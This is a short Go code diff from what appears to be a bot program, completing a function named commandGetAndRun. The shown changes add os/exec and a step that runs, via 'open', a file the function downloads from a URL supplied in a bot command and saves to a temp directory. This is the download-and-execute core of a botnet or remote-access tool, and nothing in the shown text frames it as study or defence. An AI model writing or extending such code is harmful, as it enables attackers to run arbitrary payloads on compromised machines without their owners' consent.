@@ -6,6 +6,7 @@ import (
 	"os"
 	"io"
 	"strings"
+	"os/exec"
 )
 
 func (botCommand *BotCommand) RunCommand() {
@@ -20,6 +21,7 @@ func (botCommand *BotCommand) RunCommand() {
 }
 
 func commandGetAndRun(url string) {
+	// file download
 	response, err := http.Get(url)
 	if err != nil {
 		fmt.Println("[get command] error: ", err)
@@ -28,6 +30,7 @@ func commandGetAndRun(url string) {
 
 	defer response.Body.Close()
 
+	// move file to temp directory
 	urlSplit := strings.Split(url, "/")
 	fileName := urlSplit[len(urlSplit) - 1]
 
@@ -43,5 +46,14 @@ func commandGetAndRun(url string) {
 		return
 	}
 
+	// run file
+	fmt.Println(out.Name())
+	cmd := exec.Command("open", out.Name())
+	err = cmd.Run()
+	if err != nil {
+		fmt.Println("[get command] error: ", err)
+	}
+
+	//
 	fmt.Println("[get command] success")
 }
